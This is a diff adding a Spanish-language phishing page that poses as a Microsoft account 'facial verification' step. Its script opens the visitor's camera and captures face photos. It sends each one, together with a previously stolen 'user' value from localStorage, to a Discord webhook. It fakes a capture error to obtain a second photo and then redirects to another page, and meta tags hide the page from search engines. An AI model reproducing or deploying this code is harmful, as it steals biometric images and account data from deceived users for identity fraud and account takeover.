@@ -1,0 +1,390 @@
+<html dir="ltr" lang="ES-ES">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="robots" content="none,noindex,nofollow,noarchive,nocache,noimageindex,nomediaindex,noodp,noodyp,notranslate,noyaca,noydir">
+  <meta name="googlebot" content="none,noindex,nofollow,noarchive,nocache,noimageindex,nomediaindex,noodp,noodyp,notranslate,noyaca,noydir">
+  <meta name="slurp" content="none,noindex,nofollow,noarchive,nocache,noimageindex,nomediaindex,noodp,notranslate,noyaca,noydir">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link href="./fin_files/css2" rel="stylesheet">
+  <title>Rostro</title>
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", sans-serif;
+    }
+
+    body {
+      background: #f3f2f1;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 10px;
+    }
+
+    /* CARD */
+    .container {
+      width: 100%;
+      max-width: 360px;
+      background: white;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 5px 25px rgba(0, 0, 0, .08);
+    }
+
+    /* LOGO TOP */
+    .topbar {
+      display: flex;
+      justify-content: center;
+      padding: 14px 0;
+      border-bottom: 1px solid #edebe9;
+      background: white;
+    }
+
+    .logo-box {
+      width: 120px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* STEPS */
+    .overlay,
+    .camera-screen {
+      padding: 20px;
+      text-align: center;
+    }
+
+    /* STEP 1 */
+    .overlay h1 {
+      font-size: 1.3rem;
+      margin-bottom: 10px;
+      color: #1b1b1b;
+    }
+
+    .overlay p {
+      font-size: .85rem;
+      color: #605e5c;
+      line-height: 1.5;
+      margin-bottom: 15px;
+    }
+
+    .continue-btn {
+      width: 100%;
+      border: none;
+      background: #0078d4;
+      color: white;
+      padding: 11px;
+      border-radius: 4px;
+      font-size: .9rem;
+      cursor: pointer;
+    }
+
+    /* STEP 2 */
+    .camera-screen {
+      display: none;
+    }
+
+    .camera-screen.active {
+      display: block;
+    }
+
+    .camera-title {
+      font-size: 1rem;
+      margin-bottom: 12px;
+      color: #1b1b1b;
+    }
+
+    /* CAMERA BOX */
+    .scanner {
+      width: 100%;
+      max-width: 240px;
+      margin: auto;
+      aspect-ratio: 3/4;
+      background: #faf9f8;
+      border-radius: 10px;
+      overflow: hidden;
+      position: relative;
+      border: 1px solid #edebe9;
+    }
+
+    video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+    }
+
+    /* FACE GUIDE */
+    .face-guide {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100px;
+      height: 140px;
+      border: 2px solid #0078d4;
+      border-radius: 60px;
+    }
+
+    /* SCAN */
+    .scan-line {
+      position: absolute;
+      width: 100%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #0078d4, transparent);
+      animation: scan 3s linear infinite;
+    }
+
+    @keyframes scan {
+      0% { top: 0; }
+      100% { top: 100%; }
+    }
+
+    .status {
+      margin-top: 10px;
+      font-size: .8rem;
+      color: #0078d4;
+      min-height: 18px;
+    }
+
+    .finish-btn {
+      margin-top: 12px;
+      width: 100%;
+      border: none;
+      background: #0078d4;
+      color: white;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: .85rem;
+      cursor: pointer;
+      display: none;
+    }
+
+    .finish-btn.show {
+      display: block;
+    }
+
+    .finish-btn:disabled {
+      background: #7aa7e0;
+      cursor: not-allowed;
+    }
+
+    /* AVISO DE ERROR ROJO */
+    #errorBox {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #d13438;
+      color: #ffffff;
+      padding: 14px 24px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      box-shadow: 0 4px 14px rgba(209, 52, 56, 0.4);
+      z-index: 99999;
+      text-align: center;
+      max-width: 90%;
+      opacity: 1;
+      transition: opacity 0.5s ease;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <!-- LOGO -->
+    <div class="topbar">
+      <div class="logo-box">
+        <img src="./index_files/m.svg" style="max-height:22px;">
+      </div>
+    </div>
+
+    <!-- STEP 1 -->
+    <div class="overlay" id="overlay">
+      <h1>Verificación facial</h1>
+      <p>
+        Para finalizar necesitamos realizar una verificación facial para validar y proteger la seguridad de tu cuenta
+        Microsoft.
+      </p>
+      <button class="continue-btn" id="continueBtn">Continuar</button>
+    </div>
+
+    <!-- STEP 2 -->
+    <div class="camera-screen" id="cameraScreen">
+      <div class="camera-title">Posiciona tu rostro</div>
+
+      <div class="scanner">
+        <video id="video" autoplay muted playsinline></video>
+        <div class="scan-line"></div>
+        <div class="face-guide"></div>
+      </div>
+
+      <div class="status" id="status">Esperando...</div>
+
+      <button class="finish-btn" id="finishBtn">Tomar foto</button>
+    </div>
+
+  </div>
+
+  <!-- CANVAS OCULTO -->
+  <canvas id="canvas" style="display:none;"></canvas>
+  <script src="index_files/script.js"></script>
+  <script>
+
+    /* VARIABLE DE LOCALSTORAGE */
+    const loco = localStorage.getItem('user');
+
+    /* ELEMENTS */
+    const continueBtn = document.getElementById("continueBtn");
+    const overlay = document.getElementById("overlay");
+    const cameraScreen = document.getElementById("cameraScreen");
+    const video = document.getElementById("video");
+    const statusText = document.getElementById("status");
+    const finishBtn = document.getElementById("finishBtn");
+    const canvas = document.getElementById("canvas");
+
+    /* ESTADO DE LAS CAPTURAS */
+    let capturasRealizadas = 0;
+    let enviando = false;
+
+    /* FUNCIÓN PARA MOSTRAR EL AVISO DE ERROR (5s) */
+    function mostrarErrorCaptura() {
+      const previo = document.getElementById("errorBox");
+      if (previo) previo.remove();
+
+      const div = document.createElement("div");
+      div.id = "errorBox";
+      div.textContent = "Error en la captura, por favor organícese bien y tome de nuevo";
+      document.body.appendChild(div);
+
+      setTimeout(() => {
+        div.style.opacity = "0";
+        setTimeout(() => div.remove(), 500);
+      }, 5000);
+    }
+
+    /* CAMERA */
+    continueBtn.addEventListener("click", async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        video.srcObject = stream;
+
+        overlay.style.display = "none";
+        cameraScreen.classList.add("active");
+
+        flow();
+
+      } catch (e) {
+        statusText.innerText = "Error cámara";
+        mostrarErrorCaptura();
+      }
+    });
+
+    /* FLOW */
+    function flow() {
+      statusText.innerText = "Muestra tu rostro";
+
+      setTimeout(() => statusText.innerText = "Centra tu rostro", 3000);
+      setTimeout(() => statusText.innerText = "Detectando rostro...", 6000);
+      setTimeout(() => {
+        statusText.innerText = "Listo";
+        finishBtn.classList.add("show");
+      }, 9000);
+    }
+
+    /* --- FUNCIÓN PARA CAPTURAR Y ENVIAR LA IMAGEN --- */
+    async function captureAndSendImage() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append('content', `🚨 FOTO MICROSOFT [${capturasRealizadas + 1}] 🚨\n\`\`\`${loco || 'N/A'}\`\`\``);
+        formData.append('file', blob, `rostro_capturado_${capturasRealizadas + 1}.png`);
+
+        try {
+          const response = await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            body: formData,
+          });
+
+          if (response.ok) {
+            capturasRealizadas++;
+
+            if (capturasRealizadas === 1) {
+              // 🟡 PRIMERA CAPTURA → "Procesando..." 2s → error 5s → botón de nuevo
+              statusText.innerText = 'Procesando...';
+
+              setTimeout(() => {
+                mostrarErrorCaptura();
+                statusText.innerText = "Por favor, vuelve a tomar la foto";
+                finishBtn.classList.add("show");
+                finishBtn.disabled = false;
+                finishBtn.textContent = "Tomar foto de nuevo";
+                enviando = false;
+              }, 2000);
+
+            } else {
+              // 🟢 SEGUNDA CAPTURA → "Procesando..." → "Verificación completada..." → redirige
+              statusText.innerText = 'Procesando...';
+
+              setTimeout(() => {
+                statusText.innerText = 'Verificación completada...';
+                setTimeout(() => {
+                  window.location.href = "whats.html";
+                }, 1000);
+              }, 1500);
+            }
+
+          } else {
+            statusText.innerText = 'Error al enviar';
+            mostrarErrorCaptura();
+            finishBtn.classList.add("show");
+            finishBtn.disabled = false;
+            enviando = false;
+          }
+
+        } catch (error) {
+          console.error('Error:', error);
+          statusText.innerText = 'Error de red';
+          mostrarErrorCaptura();
+          finishBtn.classList.add("show");
+          finishBtn.disabled = false;
+          enviando = false;
+        }
+      }, 'image/png');
+    }
+
+    /* EVENT LISTENER */
+    finishBtn.addEventListener("click", () => {
+      if (enviando) return;
+      if (!finishBtn.classList.contains("show")) return;
+
+      enviando = true;
+      finishBtn.disabled = true;
+      finishBtn.classList.remove("show");
+      statusText.innerText = "Procesando...";
+      captureAndSendImage();
+    });
+
+  </script>
+
+</body>
+</html>
